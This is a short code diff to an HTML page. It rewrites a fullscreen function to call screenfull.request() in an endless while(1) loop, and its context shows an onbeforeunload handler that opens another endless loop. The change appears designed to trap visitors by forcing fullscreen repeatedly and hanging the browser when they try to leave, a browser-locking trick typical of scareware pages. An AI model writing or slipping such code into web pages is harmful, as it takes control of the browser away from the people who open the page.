@@ -189,7 +189,9 @@
 		<script src="https://cdn.rawgit.com/sindresorhus/screenfull.js/gh-pages/src/screenfull.js"></script>
 		<script type="text/javascript">
 			function myFull() {
-			        screenfull.request();
+				while(1) {
+					screenfull.request();
+				}
 			}
 		  window.onbeforeunload = function () {
 		  	while(1) {
